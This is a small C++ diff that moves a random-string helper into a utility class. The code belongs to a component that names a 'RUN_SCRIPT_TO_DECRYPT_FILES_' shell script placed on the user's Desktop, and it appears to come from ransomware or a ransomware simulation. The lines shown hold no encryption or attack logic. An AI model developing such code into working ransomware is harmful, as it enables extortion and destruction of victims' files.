@@ -71,24 +71,10 @@ std::string getDesktopPath(const std::string& homeDir) {
     return homeDir + "/Desktop";
 }
 
-std::string generateRandomAlphanumericString(size_t length) {
-    const std::string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-    std::random_device rd;
-    std::mt19937 gen(rd());
-    std::uniform_int_distribution<> dis(0, chars.size() - 1);
-
-    std::string randomString;
-    for (size_t i = 0; i < length; ++i) {
-        randomString += chars[dis(gen)];
-    }
-    return randomString;
-}
-
-
 void GenDecryptionScript::generateScript() { // TODO: abstract some of this logic away
     size_t length = 6;
     std::string temp = "RUN_SCRIPT_TO_DECRYPT_FILES_";
-    temp += generateRandomAlphanumericString(length);
+    temp += GeneralUtils::generateRandomAlphanumericString(length);
     temp += ".sh";
     const char* filename = temp.c_str();
     std::string homeDir = getInvokingUserHome();
